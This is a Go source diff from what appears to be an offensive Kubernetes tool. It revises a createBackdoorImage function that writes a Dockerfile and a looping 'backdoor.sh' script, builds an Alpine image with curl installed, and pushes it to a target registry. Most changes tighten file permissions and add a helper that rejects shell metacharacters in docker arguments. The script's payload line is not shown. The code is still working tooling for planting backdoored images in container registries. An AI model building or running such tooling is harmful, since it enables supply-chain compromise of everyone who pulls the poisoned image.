@@ -109,8 +109,8 @@ func cleanupBuild() error {
 }
 
 func writeTempDockerfile(content string) error {
-	// Ensure the build directory exists
-	if err := os.MkdirAll("/tmp/kubeshadow_build", 0755); err != nil {
+	// Ensure the build directory exists with secure permissions
+	if err := os.MkdirAll("/tmp/kubeshadow_build", 0750); err != nil {
 		return fmt.Errorf("failed to create build directory: %v", err)
 	}
 
@@ -119,22 +119,29 @@ func writeTempDockerfile(content string) error {
 	sanitizedContent = strings.ReplaceAll(sanitizedContent, "`", "\\`")
 	sanitizedContent = strings.ReplaceAll(sanitizedContent, "$", "\\$")
 
-	// Write Dockerfile
+	// Write Dockerfile with secure permissions
 	dockerfilePath := "/tmp/kubeshadow_build/Dockerfile"
-	if err := os.WriteFile(dockerfilePath, []byte(sanitizedContent), 0644); err != nil {
+	if err := os.WriteFile(dockerfilePath, []byte(sanitizedContent), 0600); err != nil {
 		return fmt.Errorf("failed to write Dockerfile: %v", err)
 	}
 
 	return nil
 }
 
-// Note: The Module interface methods (Validate, Execute, Cleanup, etc.) defined in the previous step are no longer
-// necessary if the command is registered directly via the global variable approach.
-// We should remove the unused struct and interface implementation to keep the code clean.
+func runDockerCommand(ctx context.Context, args ...string) error {
+	// Validate and sanitize arguments
+	for _, arg := range args {
+		if strings.ContainsAny(arg, ";&|`$") {
+			return fmt.Errorf("invalid characters in argument: %s", arg)
+		}
+	}
 
-// TODO: Remove unused RegistryBackdoorModule struct and its methods if they are no longer needed.
-// Need to verify if any other part of the codebase relies on this module implementing types.Module.
-// Based on current main.go and registry code, it seems unlikely, but worth a double check.
+	cmd := exec.CommandContext(ctx, "docker", args...)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("docker command failed: %v\nOutput: %s", err, output)
+	}
+	return nil
+}
 
 func createBackdoorImage(registryURL, imageName, tag string) error {
 	// Create a temporary directory for the Dockerfile
@@ -142,9 +149,13 @@ func createBackdoorImage(registryURL, imageName, tag string) error {
 	if err != nil {
 		return fmt.Errorf("failed to create temp directory: %v", err)
 	}
-	defer os.RemoveAll(tempDir)
+	defer func() {
+		if err := os.RemoveAll(tempDir); err != nil {
+			fmt.Printf("warning: failed to cleanup temp directory: %v\n", err)
+		}
+	}()
 
-	// Create Dockerfile
+	// Create Dockerfile with secure permissions
 	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
 	dockerfileContent := `FROM alpine:latest
 RUN apk add --no-cache curl
@@ -152,11 +163,11 @@ COPY backdoor.sh /backdoor.sh
 RUN chmod +x /backdoor.sh
 ENTRYPOINT ["/backdoor.sh"]`
 
-	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
+	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0600); err != nil {
 		return fmt.Errorf("failed to write Dockerfile: %v", err)
 	}
 
-	// Create backdoor script
+	// Create backdoor script with secure permissions
 	scriptPath := filepath.Join(tempDir, "backdoor.sh")
 	scriptContent := `#!/bin/sh
 while true; do
@@ -164,19 +175,18 @@ while true; do
     sleep 300
 done`
 
-	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0600); err != nil {
 		return fmt.Errorf("failed to write backdoor script: %v", err)
 	}
 
-	// Build and push the image
-	cmd := exec.Command("docker", "build", "-t", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag), tempDir)
-	if output, err := cmd.CombinedOutput(); err != nil {
-		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
+	// Build and push the image using sanitized commands
+	imageTag := fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag)
+	if err := runDockerCommand(context.Background(), "build", "-t", imageTag, tempDir); err != nil {
+		return err
 	}
 
-	cmd = exec.Command("docker", "push", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag))
-	if output, err := cmd.CombinedOutput(); err != nil {
-		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
+	if err := runDockerCommand(context.Background(), "push", imageTag); err != nil {
+		return err
 	}
 
 	return nil
